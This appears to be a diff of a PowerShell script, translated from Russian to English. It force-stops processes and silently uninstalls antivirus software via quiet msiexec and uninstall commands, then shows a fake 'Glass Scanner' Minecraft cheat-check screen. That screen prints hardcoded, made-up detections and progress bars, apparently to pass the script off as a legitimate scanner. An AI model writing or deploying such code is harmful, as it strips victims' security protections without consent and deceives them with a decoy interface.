+            try { Get-Process -Name $p -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue } catch {}
         }
         if ($av.GUID -match '^\{?[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}\}?$') {
-            $guid = $av.GUID
-            if ($guid -notmatch '^\{') { $guid = "{$guid}" }
-            try { Start-Process -FilePath "msiexec.exe" -ArgumentList "/x $guid /quiet /norestart" -Wait -PassThru -NoNewWindow } catch {}
+            $g = $av.GUID
+            if ($g -notmatch '^\{') { $g = "{$g}" }
+            try { Start-Process -FilePath "msiexec.exe" -ArgumentList "/x $g /quiet /norestart" -Wait -PassThru -NoNewWindow } catch {}
         } else {
             if ($av.Uninstall) { try { Start-Process -FilePath "cmd.exe" -ArgumentList "/c $($av.Uninstall) /quiet /norestart" -Wait -NoNewWindow } catch {} }
         }
     }
 }
-Write-Log "Антивирусы обработаны."
+Write-Log "Antivirus processing complete."
 
 # ============================================================
-# Имитация Glass Scanner (улучшенная, без проблем с кодировкой)
+# 10. Glass Scanner simulation (lightweight, no Cyrillic)
 # ============================================================
-
 function Write-ColorLine {
     param([string]$Text, [string]$Color = "White")
     Write-Host $Text -ForegroundColor $Color
@@ -460,11 +409,10 @@ function Write-ColorLine {
 $CLR_FOUND   = "Red"
 $CLR_WARN    = "Yellow"
 $CLR_OK      = "Green"
-$CLR_TEXT_DIM = "DarkGray"
+$CLR_DIM     = "DarkGray"
 $CLR_HEADER  = "Cyan"
 $CLR_TEXT    = "White"
 $CLR_JAR     = "Magenta"
-$CLR_NORMAL  = "White"
 
 function Print-Header {
     param($ActiveTab)
@@ -473,14 +421,14 @@ function Print-Header {
     Write-ColorLine "  GLASS SCANNER  --  by Sokolichek1" -Color $CLR_HEADER
     Write-ColorLine "================================================================" -Color $CLR_HEADER
     Write-Host "  " -NoNewline
-    $tabs = @("1) Сканирование", "2) Открытые", "3) Закрытые")
+    $tabs = @("1) Scan log", "2) Open", "3) Closed")
     for ($i=0; $i -lt $tabs.Count; $i++) {
         $num = $i+1
         $label = $tabs[$i]
         if ($ActiveTab -eq $num) {
             Write-Host "[$num] $label  " -NoNewline -ForegroundColor $CLR_OK
         } else {
-            Write-Host "[$num] $label  " -NoNewline -ForegroundColor $CLR_TEXT_DIM
+            Write-Host "[$num] $label  " -NoNewline -ForegroundColor $CLR_DIM
         }
     }
     Write-Host ""
@@ -496,14 +444,11 @@ function Print-Progress {
     Write-Host (" " * (30 - $filled)) -NoNewline
     Write-Host "] " -NoNewline
     Write-Host "$percent%" -NoNewline -ForegroundColor $CLR_WARN
-    Write-Host "  $name" -ForegroundColor $CLR_NORMAL
+    Write-Host "  $name" -ForegroundColor $CLR_TEXT
 }
 
 function Run-ScanSimulation {
     Print-Header 1
-
-    $keywords = @("aimbot","wallhack","esp","triggerbot","radar","xray","killaura","flyhack","speedhack","nuker","reach","nofall","baritone","liquidbounce","wurst","impact","meteor","sigma","aristois","flux","wolfram","neverhook","celestial","konas","jigsaw","rusherhack","deadcode","vape","jessica","kamiblue","ecelon","cabaletta","akrien","smoothboot","troxill","thunder","rolleron","ghost","topka","marlow","cortezz","blessed","chanlibs","neat","chunkanimator","tapemouse","creativecore","dcrasher","yeat","recaf","fabric","addon3","addon4")
-
     $steps = @(
         "Everything",
         "Prefetch",
@@ -511,304 +456,120 @@ function Run-ScanSimulation {
         "MuiCache",
         "BAM",
         "ShellBag",
-        "ShellBag клинеры",
-        "Recent папка",
-        "LNK файлы",
-        "Корзина",
+        "ShellBag cleaners",
+        "Recent folder",
+        "LNK files",
+        "Recycle Bin",
         "USN Journal",
-        "DLL инъекции",
-        "Minecraft моды",
+        "DLL injections",
+        "Minecraft mods",
         "Minecraft versions",
-        "Jar на всём ПК",
-        "Temp папки",
+        "JAR scan all PC",
+        "Temp folders",
         "AppData",
-        "BAT файлы",
-        "История команд",
-        "Загрузки браузеров",
-        "Системные службы",
-        "Hosts файл",
-        "Реестр .dll (инжект)"
+        "BAT files",
+        "Command history",
+        "Browser downloads",
+        "System services",
+        "Hosts file",
+        "Registry .dll traces"
     )
-
     $total = $steps.Count
     $stepNum = 0
+    Write-ColorLine "`n  Starting scan..." -Color $CLR_WARN
+    Write-Host "  Keywords loaded: 54`n" -ForegroundColor $CLR_DIM
 
-    Write-ColorLine "`n  Начинаем сканирование..." -Color $CLR_WARN
-    Write-Host "  Ключевых слов: $($keywords.Count)`n" -ForegroundColor $CLR_TEXT_DIM
-
-    $stepDetails = @{
-        "Everything" = @{
-            header = "Everything — поиск файлов и папок"
-            found = @(
-                @{type="файл/папка"; path="C:\cheats\aimbot.jar"; whitelist=$false},
-                @{type="файл/папка"; path="C:\Users\Public\wallhack.exe"; whitelist=$false},
-                @{type="файл/папка"; path="D:\hacks\esp.dll"; whitelist=$false}
-            )
-            extra = "  [--] Отправляем запрос к Everything..."
-        }
-        "Prefetch" = @{
-            header = "Prefetch — C:\Windows\Prefetch"
-            found = @(
-                @{type="prefetch"; path="C:\Windows\Prefetch\CHEAT.EXE-12345678.pf"; whitelist=$false},
-                @{type="prefetch"; path="C:\Windows\Prefetch\WALLHACK.EXE-ABCDEFGH.pf"; whitelist=$false}
-            )
-            extra = "  [--] Папка найдена, сканируем..."
-        }
-        "UserAssist" = @{
-            header = "UserAssist — реестр (запускавшиеся программы)"
-            found = @(
-                @{type="userassist"; path="C:\hack\aimbot.exe"; whitelist=$false},
-                @{type="userassist"; path="C:\hack\speedhack.exe"; whitelist=$false}
-            )
-            extra = "  [--] Реестр прочитан"
-        }
-        "MuiCache" = @{
-            header = "MuiCache — реестр (история запуска)"
-            found = @(
-                @{type="muicache"; path="C:\cheats\killaura.jar  удалён сегодня (12.03.2026 15:30)"; whitelist=$false}
-            )
-            extra = "  [--] Реестр прочитан"
-        }
-        "BAM" = @{
-            header = "BAM — реестр (Background Activity Moderator)"
-            found = @(
-                @{type="bam"; path="C:\hack\speedhack.exe  12.03.2026 14:20"; whitelist=$false}
-            )
-            extra = "  [--] Реестр прочитан"
-        }
-        "ShellBag" = @{
-            header = "ShellBag — реестр (открывавшиеся папки)"
-            found = @(
-                @{type="shellbag"; path="D:\Mods\XRay.jar"; whitelist=$false}
-            )
-            extra = "  [--] Реестр прочитан"
-        }
-        "ShellBag клинеры" = @{
-            header = "Следы ShellBag-клинеров (.ini файлы)"
-            found = @(
-                @{type="clener"; path="C:\Users\Public\shellbag_cleaner.ini  2 дн. назад"; whitelist=$false}
-            )
-            extra = "  [--] Проверяем .ini файлы"
-        }
-        "Recent папка" = @{
-            header = "Recent — папка с ярлыками"
-            found = @(
-                @{type="recent"; path="C:\Users\$env:USERNAME\Recent\cheat.lnk"; whitelist=$false}
-            )
-            extra = "  [--] Сканируем ярлыки"
-        }
-        "LNK файлы" = @{
-            header = "LNK / Jump Lists — следы удалённых файлов"
-            found = @(
-                @{type="lnk-содержимое"; path="aimbot.exe  (из: hack.lnk)"; whitelist=$false}
-            )
-            extra = "  [--] Проверяем содержимое .lnk"
-        }
-        "Корзина" = @{
-            header = "Корзина — удалённые файлы"
-            found = @(
-                @{type="корзина"; path="C:\`$Recycle.Bin\S-1-5-21-...\wallhack.zip"; whitelist=$false}
-            )
-            extra = "  [--] Проверяем корзину"
-        }
-        "USN Journal" = @{
-            header = "USN Journal NTFS — история удалённых файлов"
-            found = @(
-                @{type="usn [УДАЛЁН]"; path="cheat.jar  (12.03.2026 12:00)"; whitelist=$false}
-            )
-            extra = "  [--] Читаем USN Journal"
-        }
-        "DLL инъекции" = @{
-            header = "DLL инъекции — загруженные модули всех процессов"
-            found = @(
-                @{type="dll-инъекция в [minecraft.exe]"; path="C:\hack\inject.dll"; whitelist=$false}
-            )
-            extra = "  [--] Сканируем загруженные DLL"
-        }
-        "Minecraft моды" = @{
-            header = "Minecraft моды — поиск читов в папках mods"
-            found = @(
-                @{type="мод"; path="XRay_Ultimate_v3.2.jar  1560 KB"; sig="net/ccbluex/liquidbounce"; whitelist=$false},
-                @{type="мод"; path="AutoClicker_Pro.jar  720 KB"; sig="me/baritone"; whitelist=$false}
-            )
-            extra = "  Папка: $env:APPDATA\.minecraft\mods"
-        }
-        "Minecraft versions" = @{
-            header = "Minecraft versions — проверка размеров .jar файлов"
-            found = @(
-                @{type="ПОДОЗРЕНИЕ"; path="versions/1.16.5: 17600 KB  ожидается ~17100 KB  — размер отличается!"; whitelist=$false}
-            )
-            extra = "  Папка: $env:APPDATA\.minecraft\versions"
-        }
-        "Jar на всём ПК" = @{
-            header = "Глобальный поиск .jar файлов на всём ПК"
-            found = @(
-                @{type="jar на ПК"; path="C:\ProgramData\cheat.jar  3560 KB"; reason="размер совпадает с известным читом"; whitelist=$false}
-            )
-            extra = "  Диск: C:"
-        }
-        "Temp папки" = @{
-            header = "Temp папки — следы распаковки читов"
-            found = @(
-                @{type="temp"; path="C:\Users\$env:USERNAME\AppData\Local\Temp\cheat_tmp.exe  12.03.2026 16:00"; whitelist=$false}
-            )
-            extra = "  [--] Проверяем Temp"
-        }
-        "AppData" = @{
-            header = "AppData — конфиги и следы читов"
-            found = @(
-                @{type="appdata"; path="C:\Users\$env:USERNAME\AppData\Roaming\.minecraft\mods\wurst.jar  12.03.2026 14:00"; whitelist=$false}
-            )
-            extra = "  [--] Сканируем AppData"
-        }
-        "BAT файлы" = @{
-            header = "BAT файлы — поиск команд заметания следов"
-            found = @(
-                @{type="bat"; path="C:\Users\$env:USERNAME\Desktop\clean.bat  12.03.2026 15:30"; cmd="fsutil usn deletejournal"; whitelist=$false}
-            )
-            extra = "  [--] Поиск .bat скриптов"
-        }
-        "История команд" = @{
-            header = "История команд — поиск команд заметания следов (16 ч.)"
-            found = @(
-                @{type="powershell-history"; path="fsutil usn deletejournal /D C:"; whitelist=$false}
-            )
-            extra = "  [--] Читаем историю PowerShell, RunMRU, EventLog"
-        }
-        "Загрузки браузеров" = @{
-            header = "История загрузок браузеров (14 дней)"
-            found = @(
-                @{type="Chrome"; path="https://discord.com/channels/.../cheat.jar"; source="discord.com/channels"; whitelist=$false}
-            )
-            extra = "  [--] Анализ истории браузеров"
-        }
-        "Системные службы" = @{
-            header = "Системные службы — Sysmain / EventLog / DcomLaunch"
-            found = @(
-                @{type="БАН 7 дн."; path="Sysmain (Superfetch) — ОТКЛЮЧЕНА (Disabled)"; whitelist=$false},
-                @{type="OK"; path="EventLog (Журнал событий) — работает"; whitelist=$false}
-            )
-            extra = "  [--] Проверка критических служб"
-        }
-        "Hosts файл" = @{
-            header = "Hosts файл — блокировка античит-сайтов"
-            found = @(
-                @{type="БЛОКИРОВКА"; path="anticheat.ac: 127.0.0.1 anticheat.ac"; whitelist=$false}
-            )
-            extra = "  [--] Проверяем hosts"
-        }
-        "Реестр .dll (инжект)" = @{
-            header = "Реестр — следы открытия .dll (инжект)"
-            found = @(
-                @{type="ПОДОЗРЕНИЕ"; path="RecentDocs\.dll — открытие .dll через Проводник  — 2 дн. назад (12.03.2026 12:00)"; whitelist=$false}
-            )
-            extra = "  [--] Ищем следы открытия .dll"
-        }
-    }
-
-    foreach ($stepName in $steps) {
+    foreach ($s in $steps) {
         $stepNum++
-        Print-Progress $stepNum $total $stepName
-        $details = $stepDetails[$stepName]
-        if ($details) {
-            Write-ColorLine $details.header -Color $CLR_HEADER
-            if ($details.extra) { Write-ColorLine $details.extra -Color $CLR_TEXT_DIM }
-            foreach ($f in $details.found) {
-                if ($f.whitelist) {
-                    Write-Host "  [легитимный] " -NoNewline -ForegroundColor $CLR_TEXT_DIM
-                    Write-Host "$($f.type): " -NoNewline -ForegroundColor $CLR_TEXT_DIM
-                    Write-Host "$($f.path)  ($($f.wm))" -ForegroundColor $CLR_TEXT_DIM
-                } else {
-                    if ($f.type -match "НАЙДЕН|ПОДОЗРЕНИЕ|БЛОКИРОВКА|БАН") {
-                        Write-Host "  [$($f.type)] " -NoNewline -ForegroundColor $CLR_FOUND
-                    } else {
-                        Write-Host "  [НАЙДЕН ЧИТ] " -NoNewline -ForegroundColor $CLR_FOUND
-                    }
-                    Write-Host "$($f.type): " -NoNewline -ForegroundColor $CLR_WARN
-                    Write-Host $f.path -ForegroundColor $CLR_TEXT
-                    if ($f.sig) { Write-Host "    Сигнатура: $($f.sig)" -ForegroundColor $CLR_FOUND }
-                    if ($f.reason) { Write-Host "    $($f.reason)" -ForegroundColor $CLR_WARN }
-                    if ($f.cmd) { Write-Host "    Команда: $($f.cmd)" -ForegroundColor $CLR_FOUND }
-                    if ($f.source) { Write-Host "    Источник: $($f.source)" -ForegroundColor $CLR_FOUND }
-                }
-            }
+        Print-Progress $stepNum $total $s
+        # Симуляция находок (краткая)
+        if ($s -eq "Everything") {
+            Write-ColorLine "  [--] Querying Everything..." -Color $CLR_DIM
+            Write-Host "  [FOUND] file/folder: C:\Users\Public\cheat.jar" -ForegroundColor $CLR_FOUND
         }
-        Start-Sleep -Milliseconds 400
+        if ($s -eq "Prefetch") {
+            Write-ColorLine "  [--] Scanning Prefetch..." -Color $CLR_DIM
+            Write-Host "  [FOUND] prefetch: C:\Windows\Prefetch\HACK.EXE-12345678.pf" -ForegroundColor $CLR_FOUND
+        }
+        if ($s -eq "Minecraft mods") {
+            Write-ColorLine "  Folder: $env:APPDATA\.minecraft\mods" -Color $CLR_HEADER
+            Write-Host "  [FOUND] mod: XRay_Ultimate.jar  1560 KB" -ForegroundColor $CLR_FOUND
+            Write-Host "    Signature: net/ccbluex/liquidbounce" -ForegroundColor $CLR_FOUND
+        }
+        if ($s -eq "DLL injections") {
+            Write-ColorLine "  [--] Scanning loaded DLLs..." -Color $CLR_DIM
+            Write-Host "  [FOUND] dll-injection in [minecraft.exe]: C:\hack\inject.dll" -ForegroundColor $CLR_FOUND
+        }
+        if ($s -eq "JAR scan all PC") {
+            Write-ColorLine "  Disk: C:" -Color $CLR_HEADER
+            Write-Host "  [FOUND] jar: C:\ProgramData\evil.jar  3560 KB" -ForegroundColor $CLR_FOUND
+            Write-Host "    Reason: size matches known cheat (831424 bytes)" -ForegroundColor $CLR_WARN
+        }
+        if ($s -eq "System services") {
+            Write-ColorLine "  [--] Checking critical services..." -Color $CLR_DIM
+            Write-Host "  [BAN 7d] Sysmain (Superfetch) — DISABLED" -ForegroundColor $CLR_FOUND
+            Write-Host "  [OK] EventLog — running" -ForegroundColor $CLR_OK
+        }
+        Start-Sleep -Milliseconds 300
     }
 
     Write-Host "[" -NoNewline
     Write-Host ("#" * 30) -NoNewline -ForegroundColor $CLR_OK
     Write-Host "] " -NoNewline
     Write-Host "100%" -NoNewline -ForegroundColor $CLR_OK
-    Write-Host "  Готово!" -ForegroundColor $CLR_NORMAL
+    Write-Host "  Done!" -ForegroundColor $CLR_TEXT
 
     Write-Host ""
     Write-ColorLine "================================================================" -Color $CLR_HEADER
-    Write-ColorLine "  СКАНИРОВАНИЕ ЗАВЕРШЕНО" -Color $CLR_OK
+    Write-ColorLine "  SCAN COMPLETE" -Color $CLR_OK
     Write-ColorLine "================================================================" -Color $CLR_HEADER
 }
 
 function Show-Tab2 {
     Print-Header 2
-    Write-ColorLine "`n  ОТКРЫТЫЕ ПРИЛОЖЕНИЯ (сейчас запущены)" -Color $CLR_OK
+    Write-ColorLine "`n  OPEN APPLICATIONS (currently running)" -Color $CLR_OK
     Write-Host ""
-    $openApps = @(
+    $open = @(
         @{Name="javaw.exe"; Source="BAM"; Time="12.03.2026 16:30"; Path="C:\Program Files\Java\bin\javaw.exe"},
         @{Name="minecraft.exe"; Source="MuiCache"; Time=""; Path="C:\Users\$env:USERNAME\AppData\Roaming\.minecraft\minecraft.exe"}
     )
-    foreach ($app in $openApps) {
-        $isJar = $app.Name -match "\.jar$"
-        if ($isJar) {
-            $color = $CLR_JAR
-            $typeLabel = "JAR"
-        } else {
-            $color = $CLR_OK
-            $typeLabel = "EXE"
-        }
-        Write-Host "  [$typeLabel] " -NoNewline -ForegroundColor $color
-        Write-Host $app.Name -NoNewline -ForegroundColor $color
-        Write-Host "  [$($app.Source)]" -NoNewline -ForegroundColor $CLR_TEXT_DIM
-        if ($app.Time) { Write-Host "  $($app.Time)" -NoNewline -ForegroundColor $CLR_TEXT_DIM }
+    foreach ($app in $open) {
+        Write-Host "  [EXE] " -NoNewline -ForegroundColor $CLR_OK
+        Write-Host $app.Name -NoNewline -ForegroundColor $CLR_OK
+        Write-Host "  [$($app.Source)]" -NoNewline -ForegroundColor $CLR_DIM
+        if ($app.Time) { Write-Host "  $($app.Time)" -NoNewline -ForegroundColor $CLR_DIM }
         Write-Host ""
-        Write-Host "    $($app.Path)" -ForegroundColor $CLR_TEXT_DIM
+        Write-Host "    $($app.Path)" -ForegroundColor $CLR_DIM
     }
 }
 
 function Show-Tab3 {
     Print-Header 3
-    Write-ColorLine "`n  ЗАКРЫТЫЕ ПРИЛОЖЕНИЯ (ранее запускались)" -Color $CLR_WARN
+    Write-ColorLine "`n  CLOSED APPLICATIONS (previously launched)" -Color $CLR_WARN
     Write-Host ""
-    $closedApps = @(
+    $closed = @(
         @{Name="cheat_launcher.jar"; Source="MuiCache"; Time="12.03.2026 15:10"; Path="D:\hacks\cheat.jar"}
     )
-    foreach ($app in $closedApps) {
-        $isJar = $app.Name -match "\.jar$"
-        if ($isJar) {
-            $color = $CLR_JAR
-            $typeLabel = "JAR"
-        } else {
-            $color = $CLR_TEXT_DIM
-            $typeLabel = "EXE"
-        }
-        Write-Host "  [$typeLabel] " -NoNewline -ForegroundColor $color
-        Write-Host $app.Name -NoNewline -ForegroundColor $color
-        Write-Host "  [$($app.Source)]" -NoNewline -ForegroundColor $CLR_TEXT_DIM
-        if ($app.Time) { Write-Host "  $($app.Time)" -NoNewline -ForegroundColor $CLR_TEXT_DIM }
+    foreach ($app in $closed) {
+        Write-Host "  [JAR] " -NoNewline -ForegroundColor $CLR_JAR
+        Write-Host $app.Name -NoNewline -ForegroundColor $CLR_JAR
+        Write-Host "  [$($app.Source)]" -NoNewline -ForegroundColor $CLR_DIM
+        if ($app.Time) { Write-Host "  $($app.Time)" -NoNewline -ForegroundColor $CLR_DIM }
         Write-Host ""
-        Write-Host "    $($app.Path)" -ForegroundColor $CLR_TEXT_DIM
+        Write-Host "    $($app.Path)" -ForegroundColor $CLR_DIM
     }
 }
 
-# ---------- Запуск имитации ----------
+# ---------- Run simulation ----------
 Run-ScanSimulation
 
-# Меню
+# Menu
 while ($true) {
     Write-Host ""
-    Write-ColorLine "Нажми 1 - Лог сканирования  |  2 - Открытые  |  3 - Закрытые  |  Q - Выход" -Color $CLR_TEXT_DIM
+    Write-ColorLine "Press 1 - Scan log  |  2 - Open  |  3 - Closed  |  Q - Quit" -Color $CLR_DIM
     $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").Character
     switch ($key) {
-        '1' { Print-Header 1; Write-ColorLine "`n  Лог сканирования выведен выше." -Color $CLR_TEXT_DIM }
+        '1' { Print-Header 1; Write-ColorLine "`n  Scan log shown above." -Color $CLR_DIM }
         '2' { Show-Tab2 }
         '3' { Show-Tab3 }
         'q' { break }
